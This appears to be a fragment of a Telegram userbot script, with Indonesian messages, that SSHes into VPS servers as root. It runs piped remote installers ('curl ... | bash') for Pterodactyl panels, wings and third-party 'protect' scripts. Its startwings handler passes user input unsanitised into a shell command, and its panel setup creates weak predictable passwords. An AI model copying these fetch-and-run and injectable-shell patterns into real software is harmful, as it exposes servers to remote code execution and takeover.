<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 12 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect12.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect12:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

function executeScript(conn, scriptURL) {
  return new Promise((resolve) => {
    conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
      if (err) {
        resolve({ success: false, error: err.message });
        return;
      }

      let output = '';
      let errorOutput = '';

      stream.on('data', (data) => {
        output += data.toString();
      });

      stream.stderr.on('data', (data) => {
        errorOutput += data.toString();
      });

      stream.on('close', (code) => {
        resolve({ 
          success: code === 0, 
          code: code,
          output: output,
          error: errorOutput
        });
      });
    });
  });
}

if (msg.text?.startsWith(`${prefix}installprotectall`)) {
  try {
    const chatId = msg.chatId || msg.chat?.id;
    const args = msg.text.trim().split(' ').slice(1);
    const input = args.join(" ").trim();

    if (!input.includes(',')) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotectall ip,password</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
      return;
    }

    const [ipvps, pwvps] = input.split(',').map(i => i.trim());
    if (!ipvps || !pwvps) {
      await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
      return;
    }

    const conn = new Client();
    
    const scripts = [
      'protect1.sh', 'protect2.sh', 'protect3.sh', 'protect4.sh', 'protect5.sh',
      'protect6.sh', 'protect7.sh', 'protect8.sh', 'protect9.sh', 'protect10.sh'
    ];

    const loadingMsg = await client.sendMessage(chatId, {
      message: `<blockquote>🚀 sᴛᴀʀᴛɪɴɢ ɪɴsᴛᴀʟʟ ᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴀɴᴇʟ ${ipvps}...</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });

    let successCount = 0;
    let failCount = 0;
    let installationComplete = false;

    conn.on('ready', async () => {
      for (let i = 0; i < scripts.length; i++) {
        const scriptName = scripts[i];
        const scriptURL = `https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/${scriptName}`;

        try {
          const result = await executeScript(conn, scriptURL);
          if (result.success) {
            successCount++;
          } else {
            failCount++;
          }
        } catch (error) {
          failCount++;
        }

        const progressMsg = await client.sendMessage(chatId, {
          message: `<blockquote>➤ <b>ᴘʀᴏɢʀᴇss:</b> ${i + 1}/${scripts.length}\n✅ sᴜᴄᴄᴇss: ${successCount}\n❌ ғᴀɪʟᴇᴅ: ${failCount}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        
        setTimeout(async () => {
          try {
            await client.deleteMessages(chatId, [progressMsg.id], { revoke: true });
          } catch (e) {
          }
        }, 2000);

        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      conn.end();
      installationComplete = true;
    });

    conn.on('error', (err) => {
      console.error("SSH Error:", err.message);
      failCount = scripts.length;
      installationComplete = true;
    });

    const waitForCompletion = () => {
      return new Promise((resolve) => {
        const checkInterval = setInterval(() => {
          if (installationComplete) {
            clearInterval(checkInterval);
            resolve();
          }
        }, 1000);

        setTimeout(() => {
          clearInterval(checkInterval);
          installationComplete = true;
          resolve();
        }, 120000);
      });
    };

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });

    await waitForCompletion();

    try {
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
    } catch (e) {
      console.warn("Gagal hapus loading message");
    }

    await client.sendMessage(chatId, {
      message: `<blockquote> <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛ ᴘᴀɴᴇʟ sᴇʟᴇsᴀɪ</b>\n\n➤ <b>ᴠᴘs:</b> ${ipvps}\n➤ sᴜᴄᴄᴇss: ${successCount}\n➤ ɢᴀɢᴀʟ: ${failCount}\n➤ ᴛᴏᴛᴀʟ: ${scripts.length}\n\n${successCount === scripts.length ? '✅ ᴀʟʟ ɪɴsᴛᴀʟʟ sᴜᴄᴄᴇssғᴜʟʟʏ!' : successCount >= 5 ? '⚠️ sᴏᴍᴇ ғᴀɪʟᴇᴅ' : '❌ ᴍᴜʟᴛɪᴘʟᴇ ɪɴsᴛᴀʟʟ ғᴀɪʟᴇᴅ'}</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });

  } catch (err) {
    console.error("❌ Error .installprotectall:", err);
    const chatId = msg.chatId || msg.chat?.id;
    await client.sendMessage(chatId, {
      message: `<blockquote>⚠️ ᴇʀʀᴏʀ: ${err.message}</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
  }
  return;
}

       // .ttsearch
       if (msg.text?.startsWith(`${prefix}ttsearch`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const query = msg.text.split(' ').slice(1).join(' ').trim();
            let inlineSuccess = false;

            if (!query) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>Format:</b> <code>${prefix}ttsearch [kata kunci]</code></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }

            // Hapus pesan perintah
            try { await client.deleteMessages(msg.chatId, [msg.id], { revoke: true }); } catch (e) { }

            // Kirim loading message
            const loadingMsg = await client.sendMessage(chatId, {
                message: "<blockquote>🔎 <b>Mencari video TikTok...</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });

            try {
                const searchUrl = `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(query)}&count=5`;
                const searchRes = await axios.get(searchUrl, { timeout: 20000 });
                const searchData = searchRes.data || {};
                
                let videos = null;
                if (Array.isArray(searchData.data)) videos = searchData.data;
                else if (Array.isArray(searchData.data?.videos)) videos = searchData.data.videos;
                else if (Array.isArray(searchData.data?.list)) videos = searchData.data.list;
                else if (Array.isArray(searchData.data?.aweme_list)) videos = searchData.data.aweme_list;
                else videos = searchData.data ? (Array.isArray(searchData.data) ? searchData.data : []) : [];
                
                if (!videos || videos.length === 0) {
                    try {
                        await client.deleteMessages(chatId, [Number(loadingMsg.id)], { revoke: true });
                    } catch {}
                    
                    await client.sendMessage(chatId, {
                        message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴜɴᴛᴜᴋ: <b>${query}</b></blockquote>`,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    return;
                }

                // Hapus loading message
                try {
                    await client.deleteMessages(chatId, [Number(loadingMsg.id)], { revoke: true });
                } catch {}

                // Simpan hasil pencarian ke global SEBELUM memanggil inline bot
                if (!global.ttsearchResults) global.ttsearchResults = {};
                const searchId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 6);
                global.ttsearchResults[searchId] = {
                    videos: videos,
                    query: query,
                    timestamp: Date.now(),
                    chatId: chatId
                };

                // Hapus data setelah 10 menit
                setTimeout(() => {
                    if (global.ttsearchResults[searchId]) {
                        delete global.ttsearchResults[searchId];
                    }
                }, 600000);

                // Dapatkan bot entity
                const botUsername = config.botUsername || 'Aksesadd_bot';
                const botEntity = await client.getInputEntity("@" + botUsername);

                let inputPeer;
                try {
                    if (msg._inputChat) {
                        inputPeer = msg._inputChat;
                    } else if (msg.inputChat) {
                        inputPeer = msg.inputChat;
                    } else if (typeof msg.getInputChat === 'function') {
                        inputPeer = await msg.getInputChat();
                    } else if (msg.peerId) {
                        const peerId = msg.peerId;
                        if (peerId.className === 'PeerUser') {
                            const sender = await msg.getSender();
                            if (sender) {
                                inputPeer = new Api.InputPeerUser({
                                    userId: sender.id,
                                    accessHash: sender.accessHash || BigInt(0)
                                });
                            }
                        } else if (peerId.className === 'PeerChat') {
                            inputPeer = new Api.InputPeerChat({
                                chatId: peerId.chatId
                            });
                        } else if (peerId.className === 'PeerChannel') {
                            const chat = await msg.getChat();
                            inputPeer = new Api.InputPeerChannel({
                                channelId: peerId.channelId,
                                accessHash: chat?.accessHash || BigInt(0)
                            });
                        }
                    }
                    if (!inputPeer) {
                        inputPeer = new Api.InputPeerSelf();
                    }
                } catch (peerErr) {
                    console.log(`[TTSEARCH] Failed to get inputPeer: ${peerErr.message}`);
                    inputPeer = new Api.InputPeerSelf();
                }

                // Buat query untuk inline bot
                const inlineQuery = `ttsearch_${searchId}`;
                console.log(`[TTSEARCH] Query to inline bot: "${inlineQuery}"`);

                // Beri sedikit delay agar global data siap
                await new Promise(resolve => setTimeout(resolve, 500));

                const results = await client.invoke(
                    new Api.messages.GetInlineBotResults({
                        bot: botEntity,
                        peer: inputPeer,
                        query: inlineQuery,
                        offset: ""
                    })
                );

                if (results && results.results && results.results.length > 0) {
                    try {
                        await client.invoke(
                            new Api.messages.SendInlineBotResult({
                                peer: inputPeer,
                                queryId: results.queryId,
                                id: results.results[0].id,
                                randomId: BigInt(Math.floor(Math.random() * 1e15))
                            })
                        );
                        inlineSuccess = true;
                        console.log(`[TTSEARCH] Successfully sent inline search results`);
                    } catch (sendErr) {
                        console.log(`[TTSEARCH] SendInlineBotResult failed: ${sendErr.message}`);
                    }
                } else {
                    console.log(`[TTSEARCH] No inline results returned, sending manual message`);
                }

                if (!inlineSuccess) {
                    // Buat tombol pilihan manual
                    const buttons = [];
                    for (let i = 0; i < Math.min(videos.length, 5); i++) {
                        const video = videos[i];
                        const title = (video.title || `Video ${i+1}`).substring(0, 40);
                        const author = video.author?.unique_id || video.author?.nickname || "unknown";
                        
                        buttons.push([
                            {
                                text: `${i+1}. ${title} - @${author}`,
                                callback_data: `ttselect_${searchId}_${i}`
                            }
                        ]);
                    }
                    
                    const resultText = `<blockquote>🔍 <b>HASIL PENCARIAN TIKTOK</b>\n\n` +
                        `<b>Kata Kunci:</b> ${query}\n` +
                        `<b>Total:</b> ${videos.length} video ditemukan\n\n` +
                        `<b>Pilih video yang ingin diambil:</b></blockquote>`;
                    
                    await client.sendMessage(chatId, {
                        message: resultText,
                        parseMode: "html",
                        replyTo: msg.id,
                        replyMarkup: {
                            inline_keyboard: [
                                ...buttons,
                                [{ text: "❌ Batal", callback_data: `ttselect_cancel_${searchId}` }]
                            ]
                        }
                    });
                }
                
            } catch (err) {
                try {
                    await client.deleteMessages(chatId, [Number(loadingMsg.id)], { revoke: true });
                } catch {}
                
                let errorMsg = `<blockquote>❌ <b>GAGAL MENCARI VIDEO</b>\n\n`;
                
                if (err.message?.includes("timeout")) {
                    errorMsg += `Timeout: Proses terlalu lama\n`;
                } else if (err.message?.includes("ENOTFOUND")) {
                    errorMsg += `Gagal terhubung ke server\n`;
                } else if (err.response?.status === 404) {
                    errorMsg += `Video tidak ditemukan\n`;
                } else if (err.message?.includes("BOT_RESPONSE_TIMEOUT")) {
                    errorMsg += `Bot tidak merespons, menggunakan mode manual\n\n`;
                    // Coba kirim manual
                    try {
                        if (global.ttsearchResults) {
                            const searchId = Object.keys(global.ttsearchResults).find(key => 
                                global.ttsearchResults[key].chatId === chatId && 
                                global.ttsearchResults[key].query === query
                            );
                            if (searchId && global.ttsearchResults[searchId]) {
                                const videos = global.ttsearchResults[searchId].videos;
                                const buttons = [];
                                for (let i = 0; i < Math.min(videos.length, 5); i++) {
                                    const video = videos[i];
                                    const title = (video.title || `Video ${i+1}`).substring(0, 40);
                                    const author = video.author?.unique_id || video.author?.nickname || "unknown";
                                    buttons.push([{
                                        text: `${i+1}. ${title} - @${author}`,
                                        callback_data: `ttselect_${searchId}_${i}`
                                    }]);
                                }
                                const resultText = `<blockquote>🔍 <b>HASIL PENCARIAN TIKTOK</b>\n\n<b>Kata Kunci:</b> ${query}\n<b>Total:</b> ${videos.length} video ditemukan\n\n<b>Pilih video:</b></blockquote>`;
                                await client.sendMessage(chatId, {
                                    message: resultText,
                                    parseMode: "html",
                                    replyMarkup: { inline_keyboard: [...buttons, [{ text: "❌ Batal", callback_data: `ttselect_cancel_${searchId}` }]] }
                                });
                                return;
                            }
                        }
                    } catch (manualErr) {}
                } else {
                    errorMsg += `Error: ${err.message}\n`;
                }
                
                errorMsg += `\nCoba kata kunci lain atau coba lagi nanti.</blockquote>`;
                
                await client.sendMessage(chatId, {
                    message: errorMsg,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (error) {
            console.error("ttsearch handler error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ Error: ${error.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .installpanel
async function editReply(chatId, messageId, text, parseMode = "html") {
    try {
        await client.editMessage(chatId, {
            messageId: messageId,
            text: text,
            parseMode: parseMode
        });
    } catch (error) {
        console.error("Edit reply error:", error);
    }
}

function generateReadableString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

if (msg.text?.startsWith(`${prefix}uninstallwings`)) {
    (async () => {
        try {
        
            const args = msg.text.split(' ').slice(1);
            const text = args.join(' ');
            
            if (!text || !text.includes(',')) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ғᴏʀᴍᴀᴛ: <code>${prefix}uninstallwings ipvps,pwvps</code></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            try {
                await client.deleteMessages(msg.chatId, [msg.id], { revoke: true });
            } catch (e) {}
            
            const [vpsIP, vpsPassword] = text.split(',').map(a => a.trim());
            
            const processingMsg = await client.sendMessage(msg.chatId, {
                message: `<blockquote>🔄 <b>ᴍᴇᴍᴜʟᴀɪ ᴘʀᴏsᴇs SSH ᴜɴᴛᴜᴋ ᴜɴɪɴsᴛᴀʟʟ ᴡɪɴɢs...</b>

ᴠᴘs: <code>${vpsIP}</code></blockquote>`,
                parseMode: "html"
            });
            
            const ssh = new Client();
            const connSettings = { 
                host: vpsIP, 
                port: 22, 
                username: 'root', 
                password: vpsPassword, 
                readyTimeout: 20000 
            };
            
            const commandInstaller = `bash <(curl -s https://pterodactyl-installer.se)`;
            
            try {
                await new Promise((resolve, reject) => {
                    ssh.on('ready', resolve).on('error', reject).connect(connSettings);
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg, 
                    `<blockquote>🔄 <b>ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴄʀɪᴘᴛ ᴜɴɪɴsᴛᴀʟᴀsɪ ᴡɪɴɢs...</b>

ᴠᴘs: <code>${vpsIP}</code></blockquote>`);
                
                await new Promise((resolve, reject) => {
                    ssh.exec(commandInstaller, (err, stream) => {
                        if (err) return reject(err);
                        
                        let scriptCompleted = false;
                        
                        stream.on('close', (code) => {
                            if (!scriptCompleted) {
                                if (code !== 0) return reject(new Error('Script gagal'));
                                resolve();
                            }
                        });
                        
                        stream.on('data', (data) => {
                            const output = data.toString();
                            console.log("UNINSTALL WINGS OUTPUT:", output);
                            
                            if (output.includes("Input 0-6")) {
                                stream.write("6\n");
                            } 
                            if (output.includes("Do you want to remove panel? (y/N)")) {
                                stream.write("n\n");
                            }
                            if (output.includes("Do you want to remove Wings (daemon)? (y/N)")) {
                                stream.write("y\n");
                            }
                            if (output.includes("Continue with uninstallation? (y/N)")) {
                                stream.write("y\n");
                                scriptCompleted = true;
                            }
                            if (output.includes("Choose the panel database (to skip don't input anything)")) {
                                stream.write("\n");
                            }
                            if (output.includes("Choose the panel user (to skip don't input anything)")) {
                                stream.write("\n");
                            }
                        });
                        
                        stream.stderr.on('data', (data) => {
                            console.error("UNINSTALL WINGS STDERR:", data.toString());
                        });
                    });
                });
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>✅ <b>ᴜɴɪɴsᴛᴀʟʟ ᴡɪɴɢs ʙᴇʀʜᴀsɪʟ!</b>

ᴠᴘs: <code>${vpsIP}</code>
sᴛᴀᴛᴜs: ᴡɪɴɢs ᴛᴇʟᴀʜ ᴅɪᴜɴɪɴsᴛᴀʟʟ

<i>ᴘᴀɴᴇʟ ᴛᴇᴛᴀᴘ ᴛᴇʀɪɴsᴛᴀʟʟ, ʜᴀɴʏᴀ ᴡɪɴɢs ʏᴀɴɢ ᴅɪʜᴀᴘᴜs</i></blockquote>`,
                    parseMode: "html"
                });
                
            } catch (err) {
                console.error("Uninstall wings error:", err);
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴜɴɪɴsᴛᴀʟʟ ᴡɪɴɢs</b>

ᴇʀʀᴏʀ: <code>${err.message}</code>

ᴘᴇʀɪᴋsᴀ:
• IP VPS ʙᴇɴᴀʀ
• ᴘᴀssᴡᴏʀᴅ ʀᴏᴏᴛ ʙᴇɴᴀʀ
• VPS ʙɪsᴀ ᴅɪᴀᴋsᴇs ᴠɪᴀ SSH
• ɪɴᴛᴇʀɴᴇᴛ VPS sᴛᴀʙɪʟ</blockquote>`,
                    parseMode: "html"
                });
            } finally {
                ssh.end();
            }
            
        } catch (error) {
            console.error("Uninstall wings handler error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b>\n<code>${error.message}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}startwings`)) {
    (async () => {
        try {
            
            const args = msg.text.split(' ').slice(1);
            const text = args.join(' ');
            
            if (!text || text.split(',').length < 3) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ғᴏʀᴍᴀᴛ: <code>${prefix}startwings ipvps,pwvps,token_node</code></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const parts = text.split(',');
            const ipvps = parts[0].trim();
            const passwd = parts[1].trim();
            const token = parts.slice(2).join(',').trim();
            
            try {
                await client.deleteMessages(msg.chatId, [msg.id], { revoke: true });
            } catch (e) {}
            
            const processingMsg = await client.sendMessage(msg.chatId, {
                message: `<blockquote>🔄 <b>ᴍᴇᴍᴜʟᴀɪ ᴋᴏɴᴇᴋsɪ SSH ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴡɪɴɢs...</b>

ᴠᴘs: <code>${ipvps}</code></blockquote>`,
                parseMode: "html"
            });
            
            const ssh = new Client();
            const connSettings = { 
                host: ipvps, 
                port: 22, 
                username: 'root', 
                password: passwd, 
                readyTimeout: 15000 
            };
            
            const commandSSH = `${token} && systemctl start wings`;
            
            try {
                await new Promise((resolve, reject) => {
                    ssh.on('ready', resolve).on('error', reject).connect(connSettings);
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>🔄 <b>ᴍᴇɴɢᴏɴғɪɢᴜʀᴀsɪ ᴅᴀɴ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴡɪɴɢs...</b>

ᴠᴘs: <code>${ipvps}</code>
ᴛᴏᴋᴇɴ: <code>${token.substring(0, 20)}...</code></blockquote>`);
                
                await new Promise((resolve, reject) => {
                    ssh.exec(commandSSH, (err, stream) => {
                        if (err) return reject(err);
                        
                        let outputBuffer = '';
                        
                        stream.on('data', (data) => {
                            const output = data.toString();
                            outputBuffer += output;
                            console.log("START WINGS OUTPUT:", output);
                        });
                        
                        stream.on('close', (code) => {
                            console.log("START WINGS COMPLETE, code:", code);
                            resolve(outputBuffer);
                        });
                        
                        stream.stderr.on('data', (data) => {
                            console.error("START WINGS STDERR:", data.toString());
                        });
                    });
                });
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>✅ <b>ᴡɪɴɢs ʙᴇʀʜᴀsɪʟ ᴅɪᴊᴀʟᴀɴᴋᴀɴ!</b>

ᴠᴘs: <code>${ipvps}</code>
sᴛᴀᴛᴜs: ᴡɪɴɢs sᴇʀᴠɪᴄᴇ sᴛᴀʀᴛᴇᴅ

<i>ᴡɪɴɢs sᴇᴋᴀʀᴀɴɢ ᴀᴋᴛɪғ ᴅᴀɴ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ sᴇʀᴠᴇʀ</i></blockquote>`,
                    parseMode: "html"
                });
                
            } catch (err) {
                console.error("Start wings error:", err);
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ɢᴀɢᴀʟ sᴛᴀʀᴛ ᴡɪɴɢs</b>

ᴇʀʀᴏʀ: <code>${err.message}</code>

ᴘᴇʀɪᴋsᴀ:
• ᴛᴏᴋᴇɴ ᴡɪɴɢs ᴠᴀʟɪᴅ
• ᴡɪɴɢs sᴜᴅᴀʜ ᴛᴇʀɪɴsᴛᴀʟʟ
• sʏsᴛᴇᴍᴄᴛʟ sᴇʀᴠɪᴄᴇ ᴀᴅᴀ</blockquote>`,
                    parseMode: "html"
                });
            } finally {
                ssh.end();
            }
            
        } catch (error) {
            console.error("Start wings handler error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b>\n<code>${error.message}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installpanel`)) {
    (async () => {
        try {
            
            const args = msg.text.split(' ').slice(1);
            const text = args.join(' ');
            
            if (!text || text.split('|').length < 5) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ғᴏʀᴍᴀᴛ: <code>${prefix}installpanel ipvps|pwvps|panel.com|node.com|ramserver</code></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [vpsIP, vpsPassword, domainpanel, domainnode, ramserver] = text.split('|').map(a => a.trim());
            
            const user = "Suika" + generateReadableString(4);
            const pass = "1234" + generateReadableString(4);
            
            try {
                await client.deleteMessages(msg.chatId, [msg.id], { revoke: true });
            } catch (e) {}
            
            const processingMsg = await client.sendMessage(msg.chatId, {
                message: `<blockquote>🔄 <b>ᴍᴇᴍᴜʟᴀɪ ɪɴsᴛᴀʟᴀsɪ ᴘᴀɴᴇʟ...</b>

⏱️ <i>ᴘʀᴏsᴇs ɪɴɪ ᴍᴇᴍᴀᴋᴀɴ ᴡᴀᴋᴛᴜ 10-15 menit</i>

ᴠᴘs: <code>${vpsIP}</code>
ᴘᴀɴᴇʟ: ${domainpanel}
Node: ${domainnode}</blockquote>`,
                parseMode: "html"
            });
            
            const ssh = new Client();
            const connSettings = { 
                host: vpsIP, 
                port: 22, 
                username: 'root', 
                password: vpsPassword 
            };
            
            const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;
            const commandCreateNode = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)`;
            let wingsTokenCommand = "";
            
            try {
                await new Promise((resolve, reject) => {
                    ssh.on('ready', resolve).on('error', reject).connect(connSettings);
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>🔄 <b>Step 1: ᴍᴇɴɢɪɴsᴛᴀʟʟ ᴘᴀɴᴇʟ...</b>

⏱️ <i>ᴛᴜɴɢɢᴜ sᴇᴋɪᴛᴀʀ 5 menit</i></blockquote>`);
                
                await new Promise((resolve, reject) => {
                    ssh.exec(commandPanel, (err, stream) => {
                        if (err) return reject(err);
                        
                        stream.on('close', (code) => {
                            if (code !== 0) return reject(new Error('Panel installation failed'));
                            resolve();
                        });
                        
                        stream.on('data', (data) => {
                            const output = data.toString();
                            console.log("PANEL INSTALL OUTPUT:", output);
                            
                            if (output.includes("Input 0-6")) stream.write("0\n");
                            else if (output.includes("Database name")) stream.write("\n");
                            else if (output.includes("Database username")) stream.write("\n"); 
                            else if (output.includes("Password")) stream.write("\n");
                            else if (output.includes("Select timezone")) {
                                stream.write("Asia/Jakarta\n");
                                stream.write("Suika@gmail.com\n");
                                stream.write("Suika@gmail.com\n");
                                stream.write(`${user}\n`);
                                stream.write("Suika\n");
                                stream.write("Suika\n");
                                stream.write(`${pass}\n`);
                                stream.write(`${domainpanel}\n`);
                            }
                            else if (output.includes("(y/N)") || output.includes("(Y)es/(N)o")) stream.write("y\n");
                            else if (output.includes("Set the FQDN")) stream.write(`${domainpanel}\n`);
                        });
                        
                        stream.stderr.on('data', (data) => {
                            console.error("PANEL INSTALL STDERR:", data.toString());
                        });
                    });
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>✅ <b>sᴛᴇᴘ 1: ᴘᴀɴᴇʟ ʙᴇʀʜᴀsɪʟ!</b>

🔄 <b>sᴛᴇᴘ 2: ᴍᴇɴɢɪɴsᴛᴀʟ ᴡɪɴɢs...</b></blockquote>`);
                
                await new Promise((resolve, reject) => {
                    ssh.exec(commandPanel, (err, stream) => {
                        if (err) return reject(err);
                        
                        stream.on('close', (code) => {
                            if (code !== 0) return reject(new Error('Wings installation failed'));
                            resolve();
                        });
                        
                        stream.on('data', (data) => {
                            const output = data.toString();
                            console.log("WINGS INSTALL OUTPUT:", output);
                            
                            if (output.includes("Input 0-6")) stream.write("1\n");
                            else if (output.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
                            else if (output.includes("Database host username")) stream.write(`${user}\n`);
                            else if (output.includes("Database host password")) stream.write(`${pass}\n`);
                            else if (output.includes("Set the FQDN")) stream.write(`${domainnode}\n`);
                            else if (output.includes("Enter email address")) stream.write("zens@gmail.com\n");
                            else if (output.includes("(y/N)") || output.includes("(Y)es/(N)o")) stream.write("y\n");
                        });
                        
                        stream.stderr.on('data', (data) => {
                            console.error("WINGS INSTALL STDERR:", data.toString());
                        });
                    });
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>✅ <b>sᴛᴇᴘ 2: ᴡɪɴɢs ʙᴇʀʜᴀsɪʟ!</b>

🔄 <b>sᴛᴇᴘ 3: ᴍᴇᴍʙᴜᴀᴛ ɴᴏᴅᴇ...</b></blockquote>`);
                
                await new Promise((resolve, reject) => {
                    ssh.exec(commandCreateNode, (err, streamNode) => {
                        if (err) return reject(err);
                        
                        streamNode.on('close', (code) => {
                            if (code !== 0) return reject(new Error('Node creation failed'));
                            resolve();
                        });
                        
                        streamNode.on('data', (data) => {
                            const output = data.toString();
                            console.log("CREATE NODE OUTPUT:", output);
                            
                            if (output.includes("Masukkan nama lokasi: ")) streamNode.write("SGP\n");
                            else if (output.includes("Masukkan deskripsi lokasi: ")) streamNode.write("ZensyxIstc\n");
                            else if (output.includes("Masukkan domain: ")) streamNode.write(`${domainnode}\n`);
                            else if (output.includes("Masukkan nama node: ")) streamNode.write("ISTANCE NODES\n");
                            else if (output.includes("Masukkan RAM (dalam MB): ")) streamNode.write(`${ramserver}\n`);
                            else if (output.includes("Masukkan jumlah maksimum disk space (dalam MB): ")) streamNode.write(`${ramserver}\n`);
                            else if (output.includes("Masukkan Locid: ")) streamNode.write("1\n");
                        });
                        
                        streamNode.stderr.on('data', (data) => {
                            console.error("CREATE NODE STDERR:", data.toString());
                        });
                    });
                });
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>✅ <b>sᴛᴇᴘ 3: ɴᴏᴅᴇ ʙᴇʀʜᴀsɪʟ!</b>

🔄 <b>sᴛᴇᴘ 4: ᴍᴇɴɢᴀᴍʙɪʟ ᴛᴏᴋᴇɴ ᴡɪɴɢs...</b></blockquote>`);
                
                const getTokenCommand = `cd /var/www/pterodactyl && php artisan p:daemon:token 1`;
                
                await new Promise((resolve, reject) => {
                    ssh.exec(getTokenCommand, (err, stream) => {
                        if (err) return reject(err);
                        
                        stream.on('data', (data) => {
                            const output = data.toString().trim();
                            if (output.startsWith('token=')) {
                                wingsTokenCommand = output;
                            }
                        });
                        
                        stream.on('close', (code) => {
                            if (code !== 0) return reject(new Error('Failed to get wings token'));
                            resolve();
                        });
                        
                        stream.stderr.on('data', (data) => {
                            console.error("GET TOKEN STDERR:", data.toString());
                        });
                    });
                });
                
                if (!wingsTokenCommand) {
                    throw new Error('Token wings tidak ditemukan');
                }
                
                await editReply(msg.chatId, processingMsg.id || processingMsg,
                    `<blockquote>✅ <b>sᴛᴇᴘ 4: ᴛᴏᴋᴇɴ ʙᴇʀʜᴀsɪʟ!</b>

